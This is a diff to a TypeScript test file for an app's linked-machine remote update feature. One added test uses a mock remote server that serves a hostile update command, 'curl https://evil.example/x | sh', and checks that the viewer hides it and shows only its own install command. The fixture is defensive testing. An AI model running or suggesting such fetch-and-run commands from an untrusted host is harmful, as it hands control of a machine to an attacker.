@@ -198,7 +198,7 @@ describe("linked machines, on three real Inboxes", () => {
     for (const m of machines) m.id = (await getJson(m, "/api/inbox/health")).inbox_id as string;
     // Never linked, Phones off: any device request is the unknown route it always was.
     expect((await fetch(`${base(A)}/api/inbox/device/health`, { headers: { Authorization: "Bearer tok_x" } })).status).toBe(404);
-  });
+  }, 60_000);
 
   afterAll(async () => {
     for (const m of machines) {
@@ -1416,17 +1416,29 @@ describe("the forward takes no write from a tailnet guest", () => {
       expect(launches.map((launch) => launch.version)).toEqual(["v0.28.42"]);
       expect(existsSync(join(w.dataA, "inbox", "outbox", `${w.mini}.jsonl`))).toBe(false);
       await waitFor("updating on this window", async () => (await row())?.update?.phase === "updating");
+      // The remembered flags reach the command this window shows.
+      writeFileSync(join(home, ".plannotator", "install-flags.json"), JSON.stringify({ flags: ["skip-gemini"] }));
+      expect(((await (await fetch(`${base}${route}`)).json()) as Json).command).toBe("curl -fsSL https://plannotator.ai/install.sh | bash -s -- --skip-gemini");
       // The second press, from another tab, joins it.
       const again = await fetch(`${base}${route}`, { method: "POST", body: JSON.stringify({ serverSession: await w.sessionOf(w.a.port) }) });
       expect(await again.json()).toEqual({ ok: true, outcome: "joined" });
       expect(launches).toHaveLength(1);
-      // The install ends and the binary is new: the far Inbox restarts itself, once, with no window of its own open.
+      // The binary is swapped and the install script runs on (skills, plugins): that machine reads ready, this window still says Updating, and nothing restarts.
       onDisk = "0.28.42";
       writeFileSync(binary, "new");
+      await waitFor("the far machine ready", async () => ((await (await fetch(`http://127.0.0.1:${w.b.port}/api/inbox/health`)).json()) as Json).update?.state === "ready", 6_000);
+      for (let i = 0; i < 10; i++) {
+        expect((await row()).update).toMatchObject({ phase: "updating", target: "0.28.42", from: "0.28.40" });
+        await Bun.sleep(50);
+      }
+      expect(restarts).toBe(0);
+      // The install ends: the far Inbox restarts itself, once, with no window of its own open, and this window says so.
       writeFileSync(launches[0]!.resultPath, JSON.stringify({ version: "v0.28.42", exitCode: 0 }));
       rmSync(launches[0]!.lockPath, { force: true });
       await waitFor("the far machine restarting itself", () => restarts === 1, 6_000);
       expect(restarts).toBe(1);
+      await waitFor("restarting on this window", async () => (await row())?.update?.phase === "restarting", 6_000);
+      expect((await row()).update).toMatchObject({ target: "0.28.42", from: "0.28.40" });
     } finally {
       await w.stop();
     }
@@ -1445,6 +1457,53 @@ describe("the forward takes no write from a tailnet guest", () => {
       expect(existsSync(join(w.dataA, "inbox", "outbox", `${w.mini}.jsonl`))).toBe(false);
     } finally {
       await w.stop();
+    }
+  });
+
+  test("a door that answers more than it should, and a press that says up to date: only what this window picked shows, and the word goes", async () => {
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "plannotator-machines-update-door-")));
+    roots.push(root);
+    const FAR = "ibx_01K00000000000000000000001";
+    const posts: string[] = [];
+    const door = Bun.serve({
+      hostname: "127.0.0.1",
+      port: 0,
+      idleTimeout: 0,
+      async fetch(req) {
+        const route = new URL(req.url).pathname.replace("/api/inbox/device/", "");
+        if (route === "health") return Response.json({ ok: true, inbox_id: FAR, machine_links: 1, machine_update: 1, self_update: true, version: "0.28.50", update: null });
+        if (route === "threads") return Response.json({ cursor: 0, sections: [] });
+        if (route === "events") return new Response(new ReadableStream({ start: (c) => c.enqueue(new TextEncoder().encode("event: hello\ndata: {\"cursor\":0}\n\n")) }), { headers: { "Content-Type": "text/event-stream" } });
+        if (route === "update" && req.method === "POST") {
+          posts.push(await req.text());
+          return Response.json({ outcome: "up-to-date" });
+        }
+        if (route === "update") return Response.json({ current: "0.28.50", update: null, platform: "darwin", command: "curl https://evil.example/x | sh", log: "curl https://evil.example/x | sh", flags: ["--evil"], open_reviews: 0, failure: null });
+        return Response.json({ code: "device_route_not_found" }, { status: 404 });
+      },
+    });
+    const dataDir = join(root, "viewer");
+    mkdirSync(dataDir, { recursive: true });
+    InboxLinks.open(dataDir).put({ id: FAR, name: "Level", token: "tok", transport: { kind: "tailnet", url: `http://127.0.0.1:${door.port}` }, device_id: null, linked_at: "2026-11-01T00:00:00Z" });
+    // This Inbox is a build ahead of GitHub's latest.
+    const viewer = await startInboxServer({ dataDir, version: "0.28.60", binaryPath: null, phones: false, updates: { listSessions: () => [] } });
+    try {
+      const base = `http://127.0.0.1:${viewer.port}`;
+      const route = `${base}/api/inbox/machines/${FAR}/update`;
+      const row = async () => ((await (await fetch(`${base}/api/inbox/machines`)).json()) as Json).machines.find((m: Json) => m.id === FAR);
+      await waitFor("the machine online and behind this one", async () => (await row())?.update?.phase === "behind");
+      const details = await (await fetch(route)).text();
+      expect(details).not.toContain("evil");
+      expect(JSON.parse(details).command).toBe("curl -fsSL https://plannotator.ai/install.sh | bash");
+      const session = ((await (await fetch(`${base}/api/inbox/health`)).json()) as Json).serverSession as string;
+      const pressed = await fetch(route, { method: "POST", body: JSON.stringify({ serverSession: session }) });
+      expect(pressed.status).toBe(409);
+      expect(await pressed.json()).toEqual({ error: "Level is up to date.", code: "update_up_to_date" });
+      expect(posts).toEqual(["{}"]);
+      expect((await row()).update).toBeNull();
+    } finally {
+      viewer.stop();
+      door.stop(true);
     }
   });
 
